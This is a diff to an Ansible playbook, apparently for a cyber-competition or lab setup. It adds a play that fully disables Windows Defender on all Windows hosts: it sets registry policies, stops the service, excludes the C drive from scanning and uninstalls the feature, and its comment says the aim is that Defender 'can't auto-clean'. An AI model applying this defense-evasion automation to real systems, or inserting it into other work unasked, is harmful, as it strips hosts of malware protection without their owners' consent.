@@ -811,3 +811,57 @@
           add: "{{ competition_accounts | selectattr('admin') | map(attribute='sam') | list }}"
         state: present
  
+# PLAY 11: Fully disable Windows Defender on every host so it can't auto-clean
+- name: Disable Windows Defender on all hosts
+  hosts: windows
+  gather_facts: no
+ 
+  tasks:
+  
+    - name: Disable Defender via policy registry key
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
+        name: DisableAntiSpyware
+        data: 1
+        type: dword
+        state: present
+ 
+    - name: Disable Defender real-time protection
+      ansible.windows.win_regedit:
+        path: HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection
+        name: "{{ item }}"
+        data: 1
+        type: dword
+        state: present
+      loop:
+        - DisableRealtimeMonitoring
+        - DisableBehaviorMonitoring
+        - DisableOnAccessProtection
+        - DisableScanOnRealtimeEnable
+ 
+    - name: Stop and disable the Windows Defender service
+      ansible.windows.win_service:
+        name: WinDefend
+        state: stopped
+        start_mode: disabled
+      ignore_errors: yes
+ 
+    - name: Exclude the C drive from any scanning that survives the above
+      ansible.windows.win_shell: |
+        Set-MpPreference -ExclusionPath C:\ -ErrorAction SilentlyContinue
+      changed_when: true
+      ignore_errors: yes
+
+    - name: Uninstall the Windows Defender feature entirely
+      ansible.windows.win_feature:
+        name: Windows-Defender
+        state: absent
+      register: defender_feature
+ 
+    - name: Reboot if removing the Defender feature requires it
+      ansible.windows.win_reboot:
+        msg: "Rebooting after removing Windows Defender"
+        pre_reboot_delay: 15
+      when: defender_feature.reboot_required
+ 
+ 
